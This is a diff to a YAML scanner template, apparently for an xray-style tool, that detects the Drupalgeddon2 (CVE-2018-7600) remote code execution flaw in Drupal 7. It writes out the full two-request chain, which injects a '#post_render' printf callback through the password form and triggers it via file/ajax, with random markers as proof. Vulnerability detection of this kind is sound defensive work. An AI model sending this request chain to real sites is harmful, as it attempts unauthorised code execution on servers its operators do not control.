@@ -1,26 +1,28 @@
-name: poc-yaml-drupal-drupalgeddon2-rce
+name: poc-yaml-drupal-drupalgeddon2-rce  # nolint[:namematch]
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
 rules:
   - method: POST
-    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
+    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}"
     headers:
-      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
       Content-Type: application/x-www-form-urlencoded
     body: |
       form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
     search: |
-      name="form_build_id"\s+value="(.+?)"
+      name="form_build_id"\s+value="(?P<build_id>.+?)"
     expression: |
-      status==200
+      response.status == 200
   - method: POST
-    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
+    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}"
     headers:
-      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
       Content-Type: application/x-www-form-urlencoded
     body: |
-      form_build_id={{1}}
+      form_build_id={{build_id}}
     expression: |
-      body.bcontains(b'test%test')
+      response.body.bcontains(bytes(r1 + "%" + r2))
 detail:
   drupal_version: 7
   links:
-    - https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600
+    - https://github.com/dreadlocked/Drupalgeddon2
+    - https://paper.seebug.org/567/
